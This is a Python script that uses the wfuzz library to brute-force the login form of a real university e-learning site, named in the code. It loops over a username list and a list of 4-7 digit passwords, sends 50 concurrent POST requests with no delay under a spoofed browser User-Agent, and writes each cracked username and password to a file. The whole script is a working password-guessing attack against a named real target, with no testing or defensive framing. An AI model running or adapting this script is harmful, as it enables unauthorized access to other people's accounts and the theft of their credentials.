import wfuzz 
from tqdm import tqdm , trange
# TODO: make the code cleaner and in classes and functions 
# TODO: add better progress bar
# TODO: add opt.args

breaker = False
passwd_wdlst='./dictionary/4-7digits.lst'
with open(passwd_wdlst, "r") as file:
    passwords = file.read().splitlines()
    
user_wdlst='./dictionary/users.lst'
with open(user_wdlst, "r") as file:
    users = file.read().splitlines()

chunck=10000
passwords_chunck = [passwords[x:x+chunck] for x in range(0, len(passwords), chunck)]
for user in users:      
    for i in passwords_chunck:
        s = wfuzz.get_payload(i)
        # try:
        for r in tqdm(s.fuzz(scanmode=True,delay=0,cuncurrent=50,url="https://ecourse.mutah.edu.jo/login/index.php",headers=[("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0")], postdata=f"username={user}&password=FUZZ" ), desc =f"progress for {user}", unit =" passwd "):
            if r.lines ==24 :
                print(f'''
                {user} password  -----------------------> {r.description}
                ''')
                with open('./dictionary/usernames_passwords.lst', 'a') as reader:
                    reader.write(f'user ---> {user} password is {r.description} \n')
                breaker = True 
                break
        if breaker: # the interesting part!
            breaker = False
            break

